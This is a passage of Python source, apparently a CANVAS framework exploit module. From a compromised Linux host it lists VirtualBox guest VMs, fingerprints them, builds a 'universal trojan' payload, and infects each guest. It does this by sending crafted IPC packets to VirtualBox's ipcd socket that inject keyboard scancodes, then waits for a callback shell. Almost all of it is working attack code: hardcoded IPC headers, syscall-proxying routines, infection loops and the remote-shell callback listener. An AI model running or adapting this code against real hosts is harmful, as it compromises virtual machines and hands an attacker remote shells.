            return self.infect_windows_node_slow(iid_str, mosdef_payload)
        else:
            return self.infect_windows_node_fast(iid_str)

    def infect_node(self, iid_str, os_version, mosdef_payload=None):
        '''
        Small wrapper redirecting to the correct infection API.
        '''

        if mosdef_payload:
            word = 'using'
        else:
            word = 'without'
        logging.info('Attempting infection on {%s} %s a payload' % (iid_str, word))
        if os_version.upper() == 'WINDOWS':
            return self.infect_windows_node(iid_str, mosdef_payload)
        else:
            return self.infect_linux_node(iid_str, mosdef_payload)

    def infect_all_nodes(self):
        '''
        Performs the infection process.
        '''

        # First of all we need to retrieve the list of VMs (name+IID)
        # This is equivalent to vboxmanage list runningvms
        logging.info("Listing up and running VMs")

        start = timer()
        ret, vms = vboxmanage.vboxmanage_list_runningvms(handlers=self.handlers)
        if ret:
            logging.error('An error prevented us from retrieving the list of running vms! [err:%x]' % ret)
            return 0

        end = timer()
        logging.debug('Took %ss to complete vboxmanage_list_runningvms()' % (end-start))

        if not len(vms):
            logging.error('No running VMs to infect for now, please retry later.')
            return 1

        logging.info('Found %d running VMs' % len(vms))
        for vm in vms:
            logging.info('\"%s\" - {%s}' % (vm['name'], vm['iid']))

        # Now we need to detect the hostinformation!
        for vm in vms:

            # 1. Fingerprinting (1/2)
            ret, vm_guest_os = self.guess_vm_os(vm['iid'])
            if ret or not vm_guest_os:
                logging.warn('Could not fingerprint correctly the VM, the API is mostly broken, skipping VM.')
                continue

            is_windows = 'windows' in vm_guest_os.lower() or 'winnt' in vm_guest_os.lower()
            is_linux = 'linux' in vm_guest_os.lower()

            if not is_windows and not is_linux:
                logging.info('Unhandled type of VM, skipping [ver:\"%s\"]' % vm_guest_os)
                continue

            if is_windows:
                os_version="WINDOWS"
            else:
                os_version="Linux"

            # 2. Fingerprinting (2/2)
            os_arch = self.guess_vm_architecture(vm['iid'])
            logging.info('A %s (%s) VM was detected [ver:\"%s\"]' % (os_version, os_arch, vm_guest_os))

            ret = self.build_universal_trojan(os_version=os_version,
                                              os_arch=os_arch)

            if not ret:
                logging.error('Building payload failed, skipping VM')
                continue

            # 3. Unless we are forced to upload
            if self.force_upload:
                logging.info('Fast infection mode is disabled')
            else:
                logging.info('Attempting a fast infection!')
                ret = self.infect_node(vm['iid'], os_version)
                if ret:
                    logging.error('Fast infection of %s was a failure! [err: %d]' % (vm['iid'],ret))
                    continue

                # At this point, did we get something?
                infected = False
                for i in xrange(2*NBR_ATTEMPTS):
                    time.sleep(1)
                    if self.ISucceeded():
                        infected = True
                        break
                    logging.info('Waiting...')

                if infected:
                    logging.info('Injection was a success, got a shell!')
                    continue
                else:
                    logging.info('Injection failed!')

                # Little hack to reset detection process.
                self.succeeded = 0

            # 4. At this point we have to use the payload
            ret = self.infect_node(vm['iid'], os_version, self.mosdeftrojan)
            if ret:
                logging.error('Infecting %s was a failure! [err: %d]' % (vm['iid'],ret))
                continue

            # At this point, did we get something?
            infected = False
            for i in xrange(2*NBR_ATTEMPTS):
                time.sleep(1)
                if self.ISucceeded():
                    infected = True
                    break
                logging.info('Waiting...')

            if infected:
                logging.info('Injection was a success, got a shell!')
            else:
                logging.info('Injection failed!')

        return 1

    ###
    # Syscall proxying
    ###

    def send_scancodes(self, ipcc, pIKeyboard, scancodes_array):
        '''
        Special function sending an array of scancodes to the target.
        Note: This handler is specific to the exploit.
        '''

        code = """
        #import "int", "fd" as "fd"
        #import "string", "ipc_hdr1" as "ipc_hdr1"
        #import "int", "req1" as "req1"
        #import "int", "cid" as "cid"
        #import "string", "ipc_hdr2" as "ipc_hdr2"
        #import "int", "req2" as "req2"
        #import "string", "dco_call" as "dco_call"
        #import "string", "scancodes" as "scancodes"
        #import "int", "nr_scancodes" as "nr_scancodes"
        #import "local", "write" as "write"
        #import "local", "read" as "read"
        #import "local", "nanosleep" as "nanosleep"
        #import "local", "memset" as "memset"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"

        struct packet {
            unsigned char ipc_header1[24];
            int ipcm_type;
            int ipcm_req;
            int cid;
            unsigned char ipc_header2[24];
            int majminflags;
            int dco_req;
            char dco_call[10];
            int keyscan;
        };

        struct timespec {
            long tv_sec;
            long tv_nsec;
        };

        void main()
        {
            struct packet pkt;
            char buffer[2048];
            int data_length;
            struct timespec ts;
            char *p;
            char *q1;
            char *q2;
            int ret;
            int i;
            int j;

            p = &pkt;
            memset(p, 0, 82);

            memcpy(pkt.ipc_header1, ipc_hdr1, 24);
            pkt.ipcm_type = 0x1000002;
            pkt.ipcm_req = req1;
            pkt.cid = cid;
            memcpy(pkt.ipc_header2, ipc_hdr2, 24);
            pkt.majminflags = 3;
            pkt.dco_req = req2;
            memcpy(pkt.dco_call, dco_call, 10);

            q1 = scancodes;
            q2 = &pkt.keyscan;

            i = 0;
            while(i < nr_scancodes)
            {
                pkt.ipcm_req = pkt.ipcm_req + 1;
                pkt.dco_req = pkt.dco_req + 1;
                memcpy(q2, q1, 4);

                p = &pkt;
                ret = write(fd, p, 82);
                if(ret < 0)
                {
                    sendint(0);
                    sendint(ret);
                    return;
                }

                ts.tv_sec = 0;
                ts.tv_nsec = 20000000; // = 20 ms while is slow but still fine.
                nanosleep(&ts, 0);

                j=0;
                while(j < 5)
                {
                    p = &data_length;
                    ret = read(fd, p, 4); // expecting 36
                    if(ret < 0)
                    {
                        sendint(1);
                        sendint(ret);
                        return;
                    }

                    p = buffer;
                    data_length = data_length - 4;
                    ret = read(fd, p, data_length);
                    if(ret < 0)
                    {
                        sendint(2);
                        sendint(ret);
                        return;
                    }

                    if(data_length == 32)
                    {
                        j = 10;
                    }

                    j = j + 1;
                }

                j=0;
                while(j < 5)
                {
                    p = &data_length;
                    ret = read(fd, p, 4); // expecting 72
                    if(ret < 0)
                    {
                        sendint(1);
                        sendint(ret);
                        return;
                    }

                    p = buffer;
                    data_length = data_length - 4;
                    ret = read(fd, p, data_length);
                    if(ret < 0)
                    {
                        sendint(2);
                        sendint(ret);
                        return;
                    }

                    if(data_length == 68)
                    {
                        j = 10;
                    }

                    j = j + 1;
                }

                i = i + 1;
                q1 = q1 + 4;
            }

            sendint(3);
            sendint(0);
            return;
        }
        """

        L = []
        for scancodes in scancodes_array:
            for scancode in scancodes:
                L.append(scancode)

        ipc_hdr1 = '5200000001000000ffa83c75c2c80146b1158c2944da1150'.decode('hex')
        ipc_hdr2 = '2e00000001000000ef47ca43c8eba2479679a4703218089f'.decode('hex')
        method_index = ipcc.get_invoke_method_by_name('IKeyboard.PutScancode')
        dco_call = struct.pack('<QL', pIKeyboard, method_index)

        vars = {}
        vars["fd"] = self.node_fd
        vars["ipc_hdr1"] = ipc_hdr1
        vars["req1"] = ipcc.ipcm_request_index + 1
        vars["cid"] = ipcc.client_id
        vars["ipc_hdr2"] = ipc_hdr2
        vars["req2"] = ipcc.dconnect_request_index + 1
        vars["dco_call"] = dco_call
        vars["scancodes"] = ''.join(map(lambda x: struct.pack('<L', x), L))
        vars["nr_scancodes"] = len(L)

        #self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(req)

        ret1 = self.node.shell.readint(signed=True)
        ret2 = self.node.shell.readint(signed=True)
        self.node.shell.leave()

        d = {0: 'write', 1:'read', 2:'read'}
        if ret1 in [ 0, 1, 2 ]:
            logging.error('%s() error: %d' % (d[ret1], ret2))
            return -1

        ipcc.ipcm_request_index += len(L)
        ipcc.dconnect_request_index += len(L)
        logging.info('Successfully injected %d scancodes!' % len(L))
        return 0


    def node_create_connection(self, server_address):
        '''
        Creates a socket and connects to the unix path.
        '''

        code = """
        #import "string", "srv_sockname" as "srv_sockname"
        #import "local", "socket" as "socket"
        #import "local", "connect" as "connect"
        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "strcpy" as "strcpy"
        #import "local", "setsockopt" as "setsockopt"

        struct sockaddr_un {
            unsigned short sun_family;
            char        sun_path[108];
        };

        struct timeval {
            long tv_sec;
            long tv_usec;
        };

        void main()
        {
            struct sockaddr_un srv_addr;
            int res;
            int sock;
            struct timeval tv;

            memset(srv_addr.sun_path, 0, 108);
            srv_addr.sun_family = 1; // AF_UNIX
            strcpy(srv_addr.sun_path, srv_sockname);
            sock = socket(1, 1, 0); // socket(AF_UNIX, SOCK_STREAM, 0);
            sendint(sock);
            if(sock < 0)
            {
                return;
            }
            res = connect(sock, &srv_addr, 110);
            sendint(res);

            tv.tv_sec = 2;
            tv.tv_usec = 0;

            res = setsockopt(sock, 1, 20, &tv, 16); // SOL_SOCKET=1, SO_RCVTIMEO=20
            sendint(res);

            return;
        }
        """

        logging.debug('SP: create_connection')
        self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, { 'srv_sockname' : server_address })
        self.node.shell.sendrequest(req)

        # socket()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -1, "Failed to create Unix Domain Socket [err:%d]" % ret

        self.node_fd = ret
        logging.debug("Unix Domain socket created: %d" % self.node_fd)

        # connect()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            self.node_close_connection()
            return -2, "Failed connect to %s" % server_address

        logging.debug("Connected to Unix Domain socket (%s) [err:%d]" % (server_address,ret))

        # setsockopt()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            logging.warn("setsockopt failed [err:%d]" % ret)
        else:
            logging.debug('Successfully set socket timer to 2s!')

        self.node.shell.leave()
        return 0, None


    def node_close_connection(self):
        '''
        Closes the unix socket
        '''

        if self.node_fd:
            self.node.shell.close(self.node_fd)


    def node_find_socket(self):
        '''
        Search remotely for a specific unix socket.
        Returns the fullpath if successfull.
        '''

        # Singleton design pattern to boost performance
        if self.node_ipcd_path:
            return self.node_ipcd_path

        dir_list = self.node.shell.dodir('/tmp')
        if not dir_list:
            return None

        re_exp = re.compile(vboxmanage.UNIX_SOCKET_NAME_TEMPLATE)
        for x in dir_list:
            candidate, _ = x
            if re_exp.search(candidate):
                try:
                    candidate_fullpath = '/tmp/%s/ipcd' % candidate
                    ret, _ = self.node.shell.stat(candidate_fullpath)
                    if ret == 0:
                        self.node_ipcd_path = candidate_fullpath
                        return candidate_fullpath
                except Exception as e:
                    continue
        return None


    def _write(self, fd, data):
        '''
        Writes all the data in data to fd
        '''

        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "write" as "write"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int ret;
            ret = write(fd, buffer, length);
            sendint(ret);
        }
        """

        vars = {}
        vars["fd"] = fd
        vars["length"] = len(data)
        vars["buffer"] = data

        #self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code,vars)
        self.node.shell.sendrequest(message)
        ret = self.node.shell.readint(signed=True)
        self.node.shell.leave()
        if ret < 0:
            return -1
        return 0


    def _read(self, fd):
        '''
        Reads a length sent on the socket then read the whole payload
        '''

        code="""
        #import "int", "fd" as "fd"
        #import "local", "read" as "read"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int ret;
            char *p;
            char buffer[2048];
            int data_length;

            data_length = 0;
            p = &data_length;
            ret = read(fd, p, 4);
            sendint(ret);
            if(ret > 0)
            {
                sendint(data_length);
                p = buffer;
                data_length = data_length - 4;
                ret = read(fd, p, data_length);
                sendint(ret);
                if (ret > 0)
                {
                    sendblock2self(buffer, ret);
                }
            }
        }
        """

        #self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code, { "fd": fd })
        self.node.shell.sendrequest(message)

        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -1, None

        data_length = self.node.shell.readint(signed=True)

        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -2, None

        if ret == 0:
            self.node.shell.leave()
            return -3, None

        data = self.node.shell.readblock()
        self.node.shell.leave()
        return 0, struct.pack('<L', data_length) + data

    def node_send_receive(self, payload):
        '''
        Remote write & read of data on the socket, returns what is read.
        '''

        logging.debug('SP: send_receive')
        try:
            ret = self._write(self.node_fd, payload)
            if ret:
                logging.info('node_send_receive() failed to write payload!')
                return None

            time.sleep(0.01)
            ret, data = self._read(self.node_fd)
            if ret:
                logging.info('node_send_receive() failed to recv payload! [err=%x]' % ret)
                return None
            else:
                return data
        except Exception as e:
            logging.info('Error detected in node_send_receive(): %s' % str(e))
            return None


    def node_receive(self):
        '''
        Remote read of data on the socket, returns what is read.
        '''

        logging.debug('SP: receive')
        try:
            time.sleep(0.01)
            ret, data = self._read(self.node_fd)
            if ret:
                logging.info('node_receive() failed to recv payload!')
                return None
            return data
        except Exception as e:
            logging.info('Error detected in node_receive(): %s' % str(e))
            return None


    def get_vbox_version(self):
        '''
        Retrieves the VirtualBox version using a grep like search.
        '''

        # Singleton design pattern to boost performance
        if self.node_vboxsvc_path:
            return self.node_vboxsvc_path

        candidates_files = [ "/usr/lib/virtualbox/components/VBoxSVCM.so" ]

        for candidate in candidates_files:

            O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
            fd = self.node.shell.open(candidate, O_RDONLY)
            if fd < 0:
                logging.error('Reading of %s failed' % candidate)
                return 0

            data = self.node.shell.readall(fd)
            self.node.shell.close(fd)

            re_exp = re.compile('VBoxSVC-[0-9]+.[0-9]+.[0-9]+[_a-zA-Z]*\0')
            ret = re_exp.search(data)
            if ret:
                res = ret.group(0)
                self.node_vboxsvc_path = res
                return res


    ###
    # Entry point - testing/debugging only
    ###

    def run(self):
        self.setInfo("%s (in progress)"%(NAME))

        # Fetching the arguments
        self.getargs()

        # Patching the callback. By default CANVAS may use a localhost/localport
        # callback if no 'target' is specified even if the callback interface is
        # correctly set.

        self.callback = self.engine.autoListener(self,
                                                 canvasengine.UNIVERSAL_MOSDEF,
                                                 host=self.engine.callback_interface,
                                                 autoFind=False)

        for node in self.argsDict["passednodes"]:

            self.node = node
            node_type = node.nodetype
            node_name = node.getname()

            # Initialization of the two remote paths.
            self.node_vboxsvc_path = None
            self.node_ipcd_path = None

            # We can only infect Linux hosts for now
            if not "Unix Shell" in node.capabilities:
                logging.info("Node %s is not a Linux host, skipping" % node_name)
                continue

            # If the host is local then we must use the default handlers from the library
            if node_type == "LocalNode":
                logging.info('Using local handlers')
                self.handlers = None
                self.with_timer = True

            # If the host is a remote Linux node AND if it has a shell (which should
            # always be the case practically speaking, then we may define new handlers
            # for syscall proxying.
            elif node_type == 'linuxNode':

                if hasattr(node, 'shell') and node.shell:
                    logging.info('Using syscall proxying handlers')
                    self.with_timer = False
                    self.handlers = { 'find_socket':       self.node_find_socket,
                                      'create_connection': self.node_create_connection,
                                      'close_connection':  self.node_close_connection,
                                      'send_receive':      self.node_send_receive,
                                      'receive':           self.node_receive,
                                      'get_vbox_version':  self.get_vbox_version,
                                      'send_scancodes':    self.send_scancodes,
                                    }
                else:
                    logging.warn('Skipping broken Linuxnode %s' % (node_name))
                    continue
            else:
                logging.warn('Skipping unhandled Unix shell %s' % (node_name))
                continue

            # Is vbox running?
            ret = self.is_vbox_running()
            if not ret:
                logging.info('Not a host running VirtualBox')
                continue

            logging.info('Node %s is a Virtualbox Host!' % node_name)
            self.infect_all_nodes()

        self.setInfo("%s - done (success)"%(NAME))
        return 1


if __name__== "__main__":
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
